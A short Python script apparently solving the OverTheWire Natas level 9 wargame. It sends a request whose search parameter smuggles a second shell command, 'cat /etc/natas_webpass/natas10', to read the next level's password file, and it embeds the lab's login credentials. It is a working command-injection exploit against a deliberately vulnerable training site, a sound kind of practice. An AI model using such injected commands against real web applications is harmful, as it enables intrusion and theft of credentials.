import re
import requests

url="http://natas9.natas.labs.overthewire.org/?needle=apple;%20cat%20/etc/natas_webpass/natas10"

auth_user="natas9"
auth_pass="ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t"
resp = requests.get(url, auth=(auth_user, auth_pass), stream=True)
pattern = re.compile(r'([A-Za-z0-9]{5,40})')
found = 0

for i, raw_line in enumerate(resp.iter_lines(decode_unicode=True), start=1):
    if raw_line is None:
        continue
    if pattern.search(raw_line):
        print(f"{i:2d}: {raw_line}")
        found += 1
        if found >= 10:
            break
resp.close()
